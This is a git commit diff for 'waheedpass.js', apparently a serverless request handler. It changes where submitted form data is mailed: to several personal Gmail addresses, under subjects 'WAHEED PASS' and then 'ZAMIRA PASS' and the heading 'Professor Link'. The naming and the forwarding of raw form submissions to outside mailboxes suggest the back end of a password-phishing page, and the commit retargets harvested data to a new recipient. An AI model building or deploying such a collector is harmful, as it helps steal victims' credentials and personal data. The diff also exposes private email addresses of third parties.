27e71c72e7d95b04944d08314dc2874e13f22f46
ejefkmnhhj-cmyk <ejefkmnhhj@gmail.com>
2025-12-28 19:15:37 +0500

    Update waheedpass.js

--- waheedpass.js
+++ waheedpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,alinadavid22115@gmail.com",
-      subject: "WAHEED PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,za1785321@gmail.com",
+      subject: "ZAMIRA PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
